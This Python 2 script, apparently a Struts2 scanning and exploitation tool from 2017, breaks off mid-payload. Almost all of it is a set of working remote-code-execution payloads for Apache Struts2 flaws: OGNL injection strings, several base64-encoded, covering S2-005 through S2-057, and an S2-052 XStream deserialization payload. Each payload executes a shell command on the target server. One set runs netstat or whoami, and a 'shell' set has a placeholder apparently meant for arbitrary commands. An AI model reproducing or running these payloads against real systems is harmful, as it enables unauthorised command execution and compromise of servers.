#!/usr/bin/env python
# coding=utf-8
# code by Lucifer
# Date 2017/10/22

import re
import sys
import socket
import base64
import httplib
import warnings
import requests
from termcolor import cprint
from urlparse import urlparse
warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

#超时设置
TMOUT=10

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
}
headers2 = {
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
     "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}
headers_052 = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/xml"
}
class struts_baseverify:
    def __init__(self, url):
        self.url = url
        self.poc = {
                "ST2-005":base64.b64decode("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
                "ST2-008-1":'''?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29)''',
                "ST2-008-2":'''?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="netstat -an",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))''',
                "ST2-009":'''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
                "ST2-013":base64.b64decode("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
                "ST2-016":base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ=="),
                "ST2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
                "ST2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
                "ST2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''', 
                "ST2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=netstat -an''',
                "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
                "ST2-048":'''name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''',
                "ST2-052":'''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>whoami</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> ''',
                "ST2-053":'''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D''',
                "struts2-057-1":'''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
                "struts2-057-2":'''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
                }
        self.shell = {
                "struts2-005":base64.b64decode("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCdGVVpaSU5HQ09NTUFORFwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
                "struts2-008-1":'''?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29)''',
                "struts2-008-2":'''?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="FUZZINGCOMMAND",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))''',
                "struts2-009":'''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
                "struts2-013":base64.b64decode("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCdGVVpaSU5HQ09NTUFORCcpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
                "struts2-016":base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3RlVaWklOR0NPTU1BTkQlMjcudG9TdHJpbmcoKS5zcGxpdCglMjdcXHMlMjcpKSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoJTI3XFxBJTI3KSwlMjNzdHIlM2QlMjNzLmhhc05leHQoKT8lMjNzLm5leHQoKTolMjclMjcsJTIzcmVzcCUzZCUyM2NvbnRleHQuZ2V0KCUyN2NvJTI3JTJiJTI3bS5vcGVuJTI3JTJiJTI3c3ltcGhvbnkueHdvJTI3JTJiJTI3cmsyLmRpc3AlMjclMmIlMjdhdGNoZXIuSHR0cFNlciUyNyUyYiUyN3ZsZXRSZXMlMjclMmIlMjdwb25zZSUyNyksJTIzcmVzcC5zZXRDaGFyYWN0ZXJFbmNvZGluZyglMjdVVEYtOCUyNyksJTIzcmVzcC5nZXRXcml0ZXIoKS5wcmludGxuKCUyM3N0ciksJTIzcmVzcC5nZXRXcml0ZXIoKS5mbHVzaCgpLCUyM3Jlc3AuZ2V0V3JpdGVyKCkuY2xvc2UoKX0="),
                "struts2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeydGVVpaSU5HQ09NTUFORCd9KSkuc3RhcnQoKSwjYj0jYS5nZXRJbnB1dFN0cmVhbSgpLCNjPW5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKCNiKSwjZD1uZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcigjYyksI2U9bmV3IGNoYXJbMTAwMDBdLCNkLnJlYWQoI2UpLCNyZXNwLnByaW50bG4oI2UpLCNyZXNwLmNsb3NlKCk="),
                "struts2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=FUZZINGCOMMAND''',
                "struts2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=FUZZINGCOMMAND&pp=____A&ppp=%20&encoding=UTF-8''', 
                "struts2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=FUZZINGCOMMAND''',
                "struts2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=FUZZINGCOMMAND''',
                "struts2-048":'''name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='FUZZINGCOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''',
                "struts2-052":'''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>FUZZINGCOMMAND</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> ''',
                "struts2-053":'''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20%2281dc9bdb52d04dc2%22%26%26FUZZINGCOMMAND%26%26echo%20%220036dbd8313ed055%22%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInp